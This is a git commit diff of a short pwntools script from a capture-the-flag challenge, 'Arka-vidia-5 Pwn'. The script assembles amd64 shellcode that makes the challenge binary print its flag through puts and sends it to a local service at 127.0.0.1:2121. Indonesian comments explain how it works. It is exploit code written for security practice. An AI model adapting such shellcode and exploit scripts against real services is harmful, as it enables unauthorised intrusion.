fcf4ab7cad7e759fc4421d8c00fd0d6606650a77
rhamaa <r4m@protonmail.com>
2019-01-12 23:23:44 +0800

    Arka-vidia-5 Pwn

--- Arka-vidia-5/Pwn/shellcode/sh.py
+++ Arka-vidia-5/Pwn/shellcode/sh.py
@@ -2,9 +2,18 @@ from pwn import *
 
 context.arch="amd64"
 
-p = remote("127.0.0.1",2121)
+# Inti nya adalah kita harus set nilai rdi ke buf yang menyimpan flag yang terlah dibaca
+# lalu memanggil fungsi puts
+
 sh = asm("call [rsp+40]; add rdi,20; mov rax, [rsp]; mov al,46; call rax")
+# atau
+# sh = asm("mov rdi,[rsp+24];add di,564;mov rax, [rsp]; mov al,46; call rax")
 
-p.sendline(sh)
-print p.recv()
-
+DEBUG = False
+if not DEBUG:
+	p = remote("127.0.0.1",2121)
+	p.sendline(sh)
+	p.interactive()
+	
+else:
+	print sh
